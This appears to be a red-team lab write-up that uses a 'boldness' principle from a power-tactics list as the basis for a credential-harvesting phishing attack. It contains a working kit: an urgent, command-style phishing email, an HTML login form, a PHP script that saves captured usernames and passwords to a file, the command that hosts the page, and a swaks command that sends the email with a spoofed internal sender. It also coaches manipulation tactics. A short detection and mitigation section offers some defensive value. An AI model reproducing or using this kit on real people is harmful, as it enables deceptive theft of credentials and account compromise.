## **Law 28 — Enter Action with Boldness**

Interpretation (offensive context):  
Hesitation invites scrutiny. Decisive, confident communication **suppresses doubt** and pushes targets into compliance. Boldness signals legitimacy.

---

# 🎯 Attack Scenario — _High-Confidence Directive Phish (Command-Based Execution)_

You issue a **direct, authoritative instruction** that assumes compliance—no questioning, no justification.

**Persona:**

> _Viktoria Lebedeva_, 20 y/o IT Operations Lead

---

# 🔴 Red Team Objective

- Force:
    
    - immediate action
        
- Eliminate:
    
    - hesitation
        
    - analysis by target
        
- Achieve:
    
    - rapid credential capture
        

---

# 🖥️ Lab Setup

### VMs:

- **Kali (Attacker)** — 3GB
    
- **Ubuntu Victim** — 2GB
    

### Network:

- Host-only
    

---

# ⚙️ Operator Workflow

## Phase 1 — Bold Directive Construction

### Email:

> **Subject:** Immediate action required
> 
> “Re-authenticate your account now:”
> 
> [http://192.168.56.101:8080](http://192.168.56.101:8080/)

👉 No:

- apology
    
- explanation
    
- soft language
    

---

## Phase 2 — Authority Framing

Optional enhancement:

> “Security verification in progress — complete immediately.”

👉 Reinforces:

- urgency
    
- legitimacy
    

---

## Phase 3 — Payload

```bash
mkdir bold && cd bold
```

```html
<form action="cap.php" method="POST">
<input name="user" placeholder="Email">
<input type="password" name="pass" placeholder="Password">
<button>Verify</button>
</form>
```

```php
<?php
file_put_contents("creds.txt", $_POST['user']." ".$_POST['pass']."\n", FILE_APPEND);
?>
```

---

## Phase 4 — Hosting

```bash
php -S 0.0.0.0:8080
```

---

## Phase 5 — Delivery

```bash
swaks --to target@corp.local \
--from viktoria.l@corp.local \
--server 192.168.56.101 \
--data "Subject: Immediate action required

Re-authenticate your account now:

http://192.168.56.101:8080"
```

---

## Phase 6 — Execution

Target:

- perceives urgency + authority
    
- does not question
    
- complies instantly
    

👉 Boldness overrides doubt

---

# 🛠️ Tooling + Commands

### Hosting:

```bash
php -S 0.0.0.0:8080
```

---

### Delivery:

```bash
swaks --to target@corp.local --from viktoria.l@corp.local
```

---

### Logging:

```php
<?php
file_put_contents("log.txt", $_SERVER['REMOTE_ADDR']."\n", FILE_APPEND);
?>
```

---

# 🧠 Social Engineering Mapping (Hadnagy)

Relevant concepts:

- **Authority bias**
    
- **Urgency pressure**
    
- **Confidence projection**
    

Key principle:

> Confidence reduces resistance

---

# 🛡️ Detection & Defensive Insight

Indicators:

- command-style emails
    
- lack of explanation
    
- urgency without context
    

Mitigation:

- train users:
    
    - “Urgency ≠ legitimacy”
        
- enforce:
    
    - no credential requests via email
        
- monitor:
    
    - high-pressure communication patterns
        

---

# 📄 Report Artifact

### Title:

> Credential Harvest via Bold Directive Social Engineering

### Include:

- command-style email
    
- payload design
    
- credential capture
    
- analysis:
    
    - why boldness increased compliance
        
- impact:
    
    - rapid compromise
        

---

# ⚠️ Operator Insight

Hesitant attacker:

- invites scrutiny
    

Bold attacker:

- suppresses doubt
    

You don’t ask  
You **command**

---

